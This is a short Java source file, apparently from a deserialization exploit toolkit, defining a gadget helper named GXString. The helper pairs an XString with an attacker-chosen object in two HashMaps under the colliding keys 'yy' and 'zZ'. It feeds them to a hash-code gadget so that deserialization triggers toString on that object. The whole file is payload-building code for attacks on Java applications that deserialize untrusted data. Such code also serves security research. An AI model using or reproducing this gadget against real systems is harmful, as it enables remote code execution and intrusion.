package xyz.eki.marshalexp.gadget.jdk;

import com.sun.org.apache.xpath.internal.objects.XString;

import java.util.HashMap;

public class GXString {
    public static HashMap deserialize2ToString(Object obj) throws Exception{
        XString xString = new XString("Eki");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",obj);
        map1.put("zZ",xString);

        map2.put("yy",xString);
        map2.put("zZ",obj);

        HashMap gadget = GHashMap.deserialize2HashCode(map1,map2);
        return gadget;
    }
}
